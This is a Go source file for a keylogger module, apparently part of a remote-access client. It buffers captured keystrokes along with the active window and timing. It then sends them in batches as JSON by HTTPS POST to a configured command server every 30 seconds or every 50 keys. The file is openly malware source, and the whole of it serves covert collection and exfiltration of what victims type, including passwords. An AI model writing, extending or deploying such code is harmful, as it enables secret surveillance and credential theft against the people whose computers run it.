package keylogger

import (
	"bytes"
	"client/config"
	"client/utils"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"sync"
	"time"
)

type KeyLog struct {
	Key      string    `json:"key"`
	Window   string    `json:"window"`
	Time     time.Time `json:"time"`
	KeyState string    `json:"state"` // pressed/released
}

var (
	isRunning bool
	mu        sync.Mutex
	buffer    []KeyLog
)

func Keylogger() {
	mu.Lock()
	if isRunning {
		mu.Unlock()
		return
	}
	isRunning = true
	mu.Unlock()

	// Send buffer periodically
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			<-ticker.C
			flushBuffer()
		}
	}()

	// Start platform specific keylogger
	go platformKeylogger()
}

func Stop() {
	mu.Lock()
	isRunning = false
	mu.Unlock()
	flushBuffer() // Send last buffer
}

func addToBuffer(keyLog KeyLog) {
	mu.Lock()
	buffer = append(buffer, keyLog)
	// Send buffer when it reaches 50 keystrokes
	if len(buffer) >= 50 {
		go flushBuffer()
	}
	mu.Unlock()
}

func flushBuffer() {
	mu.Lock()
	if len(buffer) == 0 {
		mu.Unlock()
		return
	}

	// Copy buffer and clear it
	toSend := make([]KeyLog, len(buffer))
	copy(toSend, buffer)
	buffer = buffer[:0]
	mu.Unlock()

	sendKeyLogs(toSend)
}

func sendKeyLogs(logs []KeyLog) {
	// First convert the KeyLog array to a map
	dataMap := make(map[string]interface{})

	// Add each keystroke to the map
	for i, log := range logs {
		key := fmt.Sprintf("keystroke_%d", i)
		dataMap[key] = map[string]interface{}{
			"key":    log.Key,
			"window": log.Window,
			"time":   log.Time,
			"state":  log.KeyState,
		}
	}

	clientID := utils.GenerateClientID()

	// Create the structure the server expects
	data := struct {
		ClientID string                 `json:"client_id"`
		Type     string                 `json:"type"`
		Data     map[string]interface{} `json:"data"`
	}{
		ClientID: clientID, // Use "client_id" instead of "id"
		Type:     "keylog",
		Data:     dataMap, // Use map instead of array
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Printf("JSON conversion error: %v\n", err)
		return
	}

	serverURL := fmt.Sprintf("https://%s:%s/data", config.SERVER_IP, config.SERVER_PORT)

	fmt.Printf("Sending request to: %s\n", serverURL)

	req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Printf("HTTP request creation error: %v\n", err)
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Connection", "keep-alive")

	client := utils.HTTPClientConfig()
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("HTTP request sending error: %v\n", err)
		return
	}
	defer resp.Body.Close()

	// Check the response status
	if resp.StatusCode != http.StatusOK {
		body, _ := ioutil.ReadAll(resp.Body)
		fmt.Printf("Server returned an error: %d - %s\n", resp.StatusCode, string(body))
		return
	}

	fmt.Printf("Successfully sent: %d keystrokes\n", len(logs))
}
